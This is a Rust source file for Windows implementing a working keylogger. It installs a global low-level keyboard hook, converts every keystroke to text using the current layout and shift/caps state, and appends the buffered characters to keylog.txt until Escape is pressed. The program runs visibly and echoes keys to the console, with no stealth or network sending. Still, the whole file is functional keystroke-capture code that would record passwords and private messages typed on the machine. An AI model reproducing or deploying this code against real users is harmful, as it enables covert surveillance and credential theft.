use once_cell::sync::Lazy;
use std::fs::OpenOptions;
use std::io::Write;
use std::ptr;
use std::sync::Mutex;
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Console::{FlushConsoleInputBuffer, GetStdHandle, STD_INPUT_HANDLE};
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
use windows_sys::Win32::UI::Input::KeyboardAndMouse::{GetAsyncKeyState, GetKeyboardLayout, GetKeyboardState, ToUnicodeEx, VK_ESCAPE};
use windows_sys::Win32::UI::WindowsAndMessaging::*;
use windows_sys::Win32::UI::Input::KeyboardAndMouse::{VK_SHIFT, VK_CAPITAL};

// Static means that it lasts the entire duration of the program.
static KEY_BUFFER: Lazy<Mutex<Vec<u16>>> = Lazy::new(|| Mutex::new(Vec::new()));

pub static mut HOOK: HHOOK = ptr::null_mut();

pub unsafe extern "system" fn keyboard_procedure(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    unsafe {
        if n_code == HC_ACTION as i32 {
            if w_param == WM_KEYDOWN as usize ||
                w_param == WM_SYSKEYDOWN as usize {
                if (*(l_param as *const KBDLLHOOKSTRUCT)).vkCode as u16 == VK_ESCAPE {
                    process_escape_key();
                }
                process_keyboard_input(l_param);
            }
        }
        CallNextHookEx(HOOK, n_code, w_param, l_param)
    }
}

unsafe fn process_escape_key() {
    unsafe {
        let potential_error: BOOL = UnhookWindowsHookEx(HOOK);
        if potential_error == 0 {
            eprintln!("Failed to uninstall keyboard hook");
            eprintln!("Error code: {}", potential_error);
        }
        println!("Hook has been uninstalled and keylogger has stopped.");
        PostQuitMessage(0); // Used to break message loop
    }
}

unsafe fn process_keyboard_input(l_param: LPARAM) {
    unsafe {
        let mut unicode_buffer: [u16; 8] = [0; 8];
        let mut keyboard_array: [u8; 256] = [0; 256];
        GetKeyboardState(keyboard_array.as_mut_ptr());

        if (GetAsyncKeyState(VK_SHIFT as i32) & 0x8000u16 as i16) != 0 {
            keyboard_array[VK_SHIFT as usize] |= 0x80;
        }
        if (GetAsyncKeyState(VK_CAPITAL as i32) & 0x0001) != 0 {
            keyboard_array[VK_CAPITAL as usize] |= 0x01;
        }

        let key_pressed_struct = *(l_param as *const KBDLLHOOKSTRUCT);

        let layout = GetKeyboardLayout(0);

        let count = ToUnicodeEx(key_pressed_struct.vkCode, key_pressed_struct.scanCode, keyboard_array.as_ptr(), unicode_buffer.as_mut_ptr(), unicode_buffer.len() as i32, 0, layout);
        
        let chars = &unicode_buffer[0..count as usize];
        if let Ok(s) = String::from_utf16(chars) {
            print!("{}", s);
            let mut key_buffer = KEY_BUFFER.lock().unwrap();
            if key_buffer.len() >= 8 {
                let buff = key_buffer.clone();

                key_buffer.clear();
                for char in chars {
                    key_buffer.push(*char);
                }
                
                drop(key_buffer);

                std::io::stdout().flush().unwrap();
                log_keyboard_input(&buff);
            } else {
                for char in chars {
                    key_buffer.push(*char);
                }
                drop(key_buffer);
            }
            std::io::stdout().flush().unwrap();
        }
    }
}

fn log_keyboard_input(cloned_buffer: &Vec<u16>) {
    println!("Dumping buffer to keylog file.");
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("keylog.txt")
        .unwrap();
    if let Ok(s) = String::from_utf16(cloned_buffer) {
        file.write_all(s.as_bytes()).unwrap();
        println!("Buffer successfully dumped to keylog file.");
    } else {
        eprintln!("Failed to convert buffer to string.");
    }
}

pub fn run_keylogger() {
    unsafe {
        HOOK = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(keyboard_procedure),
            GetModuleHandleW(ptr::null()),
            0,
        );

        if HOOK.is_null() { // if the hook handle is null, we didn't install the hook.
            eprintln!("Failed to install keyboard hook");
            return;
        }

        println!("Keyboard hook installed. Press keys to see output. Press Ctrl+C to exit.");

        let mut msg = std::mem::zeroed::<MSG>(); // Zero MSG struct to receive new message information
        // It is critical to not mess with this code as it could cause critical errors
        // to the application
        while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
    }
}
